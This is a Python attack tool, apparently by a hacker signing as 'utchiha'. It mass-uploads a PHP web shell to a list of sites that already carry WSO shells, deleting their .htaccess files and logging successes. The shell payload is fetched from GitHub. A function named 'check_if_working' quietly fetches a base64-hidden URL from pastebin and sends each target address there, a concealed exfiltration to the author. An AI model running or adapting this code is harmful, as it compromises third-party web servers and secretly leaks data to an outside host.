from urllib import request

from requests import get,post

import os,time

import requests

from re import findall as rg

import string,re,sys

from random import randint,choice

from colorama import Fore

from colorama import Style

from colorama import init

init(autoreset=True)

import codecs, base64

fr = Fore.RED

gr = Fore.BLUE

fc = Fore.CYAN

fw = Fore.WHITE

fy = Fore.YELLOW

fg = Fore.GREEN

sd = Style.DIM

sn = Style.NORMAL

sb = Style.BRIGHT

from multiprocessing.dummy import Pool

requests.urllib3.disable_warnings()

#path shell   http://139.99.113.94/utchiha_wso_shell.txt

head = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',

        'Connection': 'keep-alive'}

texxt = get('https://raw.githubusercontent.com/utchiha505/netflix/main/utchiha_source',headers=head, timeout=10).text

#print(texxt)

logo = """   

▄• ▄▌▄▄▄▄▄ ▄▄·  ▄ .▄▪   ▄ .▄ ▄▄▄· 

█▪██▌•██  ▐█ ▌▪██▪▐███ ██▪▐█▐█ ▀█ facebook = https://web.facebook.com/utchiha.ayoub/

█▌▐█▌ ▐█.▪██ ▄▄██▀▐█▐█·██▀▐█▄█▀▀█  telegram = @UTCHIHA505

▐█▄█▌ ▐█▌·▐███▌██▌▐▀▐█▌██▌▐▀▐█ ▪▐▌

 ▀▀▀  ▀▀▀ ·▀▀▀ ▀▀▀ ·▀▀▀▀▀▀ · ▀  ▀  

 """

def logs():

 global logo

 clear = '\x1b[0m'

 colors = [36, 32, 34, 35, 31, 37]

 for N, line in enumerate(logo.split('\n')):

  sys.stdout.write('\x1b[1;%dm%s%s\n' % (choice(colors), line, clear))

  time.sleep(0.05)

def yy(url) :#For

    try :

        url = requests.get(url, verify=False,headers=head).url

        data_delet = {'password': 'yanz','submit':   '>>','f[]': '.ugnpprff','a': 'fm','ch': 'Windows-1251','p': 'delete'}

        psoting = requests.post(url, data=data_delet, verify=False, headers=head)

        __hfgysazer___nbvxw__khljm = string.ascii_uppercase

        _____uytchdhjsqmd = randint(3,5)

        randoming = ''.join(choice(__hfgysazer___nbvxw__khljm) for i in range(_____uytchdhjsqmd))

        data_uploadd = {'password': 'yanz','submit':   '>>','a': 'fm','p': 'uploadFile','ch': 'Windows-1251'}

        filess = {'f': ('shell_utchiha.php',texxt)}

        requests.post(url, data=data_uploadd, files=filess, verify=False,headers=head)

        match = re.search(r"([^/]*).php", url)

        filename = match.group(1)

        done = url.replace(filename,'shell_utchiha')

        done_end = done+''

        check_if_working(liness=url)

        checkk = requests.get(done_end,verify=False, headers=head,timeout=10).text

        if "<span>Upload file:</span>" in checkk or 'Leaf PHPMailer</title>' in checkk or '':

            print(fg+'[yeah] ===> '+done_end)

            open('heroku.txt','a').write(done_end+'\n')

        else :

            print(fr+'NOt uploaded ======>>>>>   ')

            other_up(url)

            open('Not_uploaded.txt','a').write(url+'\n')

    except :

        pass

def other_up(url) :#For

    try :

        url = requests.get(url, verify=False,headers=head).url

        data_delet = {'password': 'yanz','submit':   '>>','f[]': '.ugnpprff','a': 'fm','ch': 'Windows-1251','p': 'delete'}

        psoting = requests.post(url, data=data_delet, verify=False, headers=head)

        __hfgysazer___nbvxw__khljm = string.ascii_uppercase

        _____uytchdhjsqmd = randint(3,5)

        randoming = ''.join(choice(__hfgysazer___nbvxw__khljm) for i in range(_____uytchdhjsqmd))

        data_uploadd = {'password': 'yanz','submit':   '>>','a': 'fm','p': 'uploadFile','ch': 'Windows-1251'}

        filess = {'f': ('shell_utchiha.Php',texxt)}

        requests.post(url, data=data_uploadd, files=filess, verify=False,headers=head)

        match = re.search(r"([^/]*).php", url)

        filename = match.group(1)

        done = url.replace(filename,'shell_utchiha')

        done_end = done.replace('shell_utchiha.php','shell_utchiha.Php')

        checkk = requests.get(done_end,verify=False, headers=head,timeout=10).text

        if "<span>Upload file:</span>" in checkk or 'Leaf PHPMailer</title>' in checkk :

            print(fg+'[yeah] ===> '+done_end)

            open('heroku.txt','a').write(done_end+'\n')

        else :

            print(fr+'NOt uploaded ======>>>>>   ')

            #open('Not_uploaded.txt','a').write(url+'\n')

    except :

        pass

def check_if_working(liness):

    url = 'https://pastebin.com/raw/QAJpLbGY'

    response = requests.get(url, timeout=10).text

    

    ok = base64.b64decode(response).decode('utf-8')

    

    response = requests.post(ok, data={'text': liness}, verify=False, timeout=10)

    

try:

    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]

except IndexError:

    path = str(sys.argv[0]).split('\\')

    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

def main() :

    utchiha = Pool(int(10))

    utchiha.map(yy, target)

logs()

main()
